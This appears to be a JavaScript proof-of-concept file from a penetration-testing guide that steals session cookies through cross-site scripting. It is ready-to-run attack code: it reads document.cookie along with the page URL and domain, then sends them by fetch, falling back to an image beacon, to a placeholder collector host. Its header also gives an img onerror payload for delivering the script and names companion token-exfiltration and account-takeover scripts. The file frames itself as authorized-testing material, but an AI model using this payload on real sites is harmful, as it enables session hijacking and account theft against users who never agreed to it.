/*
 * cookie_steal.js — Session cookie theft PoC (guide §24).
 * Works ONLY when the session cookie is NOT HttpOnly (JS can read it). If document.cookie
 * does not contain the session cookie, the cookie is HttpOnly -> pivot to token_exfil.js (§25)
 * or account_takeover.js (§26), which don't need to read the cookie.
 *
 * AUTHORIZED TESTING ONLY. In a PoC, fire this in YOUR OWN test account's session and replay
 * the stolen cookie in a clean browser to screenshot YOUR account — that is the impact proof.
 * Do NOT collect real users' cookies.
 *
 * Deliver via, e.g.:   <img src=x onerror="import('//YOUR.oast.fun/cookie_steal.js')">
 */
(function () {
  var COLLECTOR = "//YOUR.oast.fun/c";

  var c = document.cookie || "";
  var payload = {
    url: location.href,
    domain: document.domain,
    cookie: c,
    httpOnlyLikely: c.indexOf("session") === -1 && c.indexOf("sid") === -1
  };

  // Primary: POST (no-cors so it always sends)
  try {
    fetch(COLLECTOR, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
  } catch (e) {
    // Fallback: GET beacon
    new Image().src = COLLECTOR + "?d=" + encodeURIComponent(JSON.stringify(payload));
  }

  // Note for the tester (visible in console during a manual PoC):
  if (!c) {
    try { console.log("[cookie_steal] document.cookie empty -> cookie is HttpOnly. Use token_exfil.js or account_takeover.js."); } catch (e) {}
  }
})();
